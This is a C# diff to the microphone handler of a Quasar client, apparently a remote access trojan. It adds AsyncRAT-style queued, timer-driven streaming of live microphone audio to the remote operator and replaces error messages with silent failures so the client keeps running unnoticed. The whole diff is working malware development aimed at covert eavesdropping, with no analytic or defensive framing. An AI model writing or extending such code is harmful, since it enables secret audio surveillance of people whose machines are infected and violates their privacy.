@@ -4,6 +4,7 @@ using Quasar.Common.Networking;
 using Quasar.Client.Config;
 using System;
 using System.Collections.Generic;
+using System.Collections.Concurrent;
 using System.IO;
 using System.Linq;
 using System.Threading;
@@ -24,6 +25,10 @@ namespace Quasar.Client.Messages
         private int _chunkDurationSeconds;
         private int _currentChunkIndex;
         private ISender _currentClient;
+        
+        // AsyncRAT queue-based approach for network stability
+        private readonly ConcurrentQueue<byte[]> _audioQueue = new ConcurrentQueue<byte[]>();
+        private System.Threading.Timer _sendTimer;
 
         public MicrophoneHandler()
         {
@@ -49,23 +54,49 @@ namespace Quasar.Client.Messages
 
         public void Execute(ISender sender, IMessage message)
         {
-            switch (message)
+            try
             {
-                case GetMicrophones msg:
-                    Execute(sender, msg);
-                    break;
-                case DoStartMicrophoneRecording msg:
-                    Execute(sender, msg);
-                    break;
-                case DoStopMicrophoneRecording msg:
-                    Execute(sender, msg);
-                    break;
-                case GetMicrophoneAudioLogs msg:
-                    Execute(sender, msg);
-                    break;
-                case DoRequestAudioFile msg:
-                    Execute(sender, msg);
-                    break;
+                switch (message)
+                {
+                    case GetMicrophones msg:
+                        Execute(sender, msg);
+                        break;
+                    case DoStartMicrophoneRecording msg:
+                        Execute(sender, msg);
+                        break;
+                    case DoStopMicrophoneRecording msg:
+                        Execute(sender, msg);
+                        break;
+                    case GetMicrophoneAudioLogs msg:
+                        Execute(sender, msg);
+                        break;
+                    case DoRequestAudioFile msg:
+                        Execute(sender, msg);
+                        break;
+                }
+            }
+            catch
+            {
+                // Catch ALL exceptions at the top level to prevent client crashes
+                // Send empty response based on message type
+                if (message is GetMicrophones)
+                {
+                    sender.Send(new GetMicrophonesResponse
+                    {
+                        MicrophoneNames = new string[0],
+                        MicrophoneIds = new string[0]
+                    });
+                }
+                else if (message is GetMicrophoneAudioLogs)
+                {
+                    sender.Send(new GetMicrophoneAudioLogsResponse
+                    {
+                        AudioFileNames = new string[0],
+                        AudioFileSizes = new long[0],
+                        AudioFileDates = new string[0]
+                    });
+                }
+                // For other messages, just silently fail
             }
         }
 
@@ -76,11 +107,37 @@ namespace Quasar.Client.Messages
                 var microphones = new List<string>();
                 var microphoneIds = new List<string>();
 
-                for (int i = 0; i < WaveIn.DeviceCount; i++)
+                // Wrap device count check in try-catch (AsyncRAT approach)
+                int deviceCount = 0;
+                try
                 {
-                    var capabilities = WaveIn.GetCapabilities(i);
-                    microphones.Add(capabilities.ProductName);
-                    microphoneIds.Add(i.ToString());
+                    deviceCount = WaveIn.DeviceCount;
+                }
+                catch
+                {
+                    // Silent fail - just return empty list
+                    client.Send(new GetMicrophonesResponse
+                    {
+                        MicrophoneNames = new string[0],
+                        MicrophoneIds = new string[0]
+                    });
+                    return;
+                }
+
+                // Enumerate each device with individual error handling
+                for (int i = 0; i < deviceCount; i++)
+                {
+                    try
+                    {
+                        var capabilities = WaveIn.GetCapabilities(i);
+                        microphones.Add(capabilities.ProductName);
+                        microphoneIds.Add(i.ToString());
+                    }
+                    catch
+                    {
+                        // Skip problematic device silently - AsyncRAT style
+                        continue;
+                    }
                 }
 
                 client.Send(new GetMicrophonesResponse
@@ -89,12 +146,13 @@ namespace Quasar.Client.Messages
                     MicrophoneIds = microphoneIds.ToArray()
                 });
             }
-            catch (Exception ex)
+            catch
             {
+                // Silent fail - return empty list instead of error message
                 client.Send(new GetMicrophonesResponse
                 {
-                    MicrophoneNames = new[] { "Error: " + ex.Message },
-                    MicrophoneIds = new[] { "-1" }
+                    MicrophoneNames = new string[0],
+                    MicrophoneIds = new string[0]
                 });
             }
         }
@@ -133,6 +191,12 @@ namespace Quasar.Client.Messages
 
                 _waveIn.StartRecording();
                 _isRecording = true;
+
+                // Set up AsyncRAT-style send timer for real-time streaming (50ms intervals)
+                if (_realTimeStreaming)
+                {
+                    _sendTimer = new System.Threading.Timer(SendAudioData, null, 0, 50);
+                }
 
                 // Set up chunk timer for 5-minute intervals
                 if (!_realTimeStreaming)
@@ -269,21 +333,13 @@ namespace Quasar.Client.Messages
                 _wavWriter.Write(e.Buffer, 0, e.BytesRecorded);
             }
             
-            // Send real-time data if streaming is enabled
+            // Queue real-time data if streaming is enabled (AsyncRAT approach)
             if (_realTimeStreaming && _currentClient != null)
             {
-                // Send raw PCM audio data for real-time playback
+                // Queue the audio data instead of sending directly to prevent network overload
                 byte[] audioChunk = new byte[e.BytesRecorded];
                 Array.Copy(e.Buffer, 0, audioChunk, 0, e.BytesRecorded);
-                
-                _currentClient.Send(new MicrophoneAudioData
-                {
-                    AudioData = audioChunk,
-                    FileName = "realtime",
-                    IsRealTime = true,
-                    IsComplete = false,
-                    ChunkIndex = 0
-                });
+                _audioQueue.Enqueue(audioChunk);
             }
         }
 
@@ -293,6 +349,35 @@ namespace Quasar.Client.Messages
             if (_wavWriter != null)
             {
                 FinishCurrentChunk();
+            }
+        }
+
+        /// <summary>
+        /// AsyncRAT's queue-based sending approach - prevents network overload
+        /// </summary>
+        private void SendAudioData(object state)
+        {
+            while (_audioQueue.TryDequeue(out byte[] audioData))
+            {
+                try
+                {
+                    if (_currentClient != null)
+                    {
+                        _currentClient.Send(new MicrophoneAudioData
+                        {
+                            AudioData = audioData,
+                            FileName = "realtime",
+                            IsRealTime = true,
+                            IsComplete = false,
+                            ChunkIndex = 0
+                        });
+                    }
+                }
+                catch 
+                {
+                    // Silent error handling like AsyncRAT - prevents crashes
+                    // Just skip this chunk and continue
+                }
             }
         }
 
@@ -331,6 +416,11 @@ namespace Quasar.Client.Messages
             {
                 _isRecording = false;
                 
+                // Stop AsyncRAT send timer
+                _sendTimer?.Change(Timeout.Infinite, 0);
+                _sendTimer?.Dispose();
+                _sendTimer = null;
+                
                 _chunkTimer?.Dispose();
                 _chunkTimer = null;
 
@@ -342,6 +432,9 @@ namespace Quasar.Client.Messages
                 }
 
                 FinishCurrentChunk();
+                
+                // Clear any remaining queued audio
+                while (_audioQueue.TryDequeue(out _)) { }
             }
         }
 
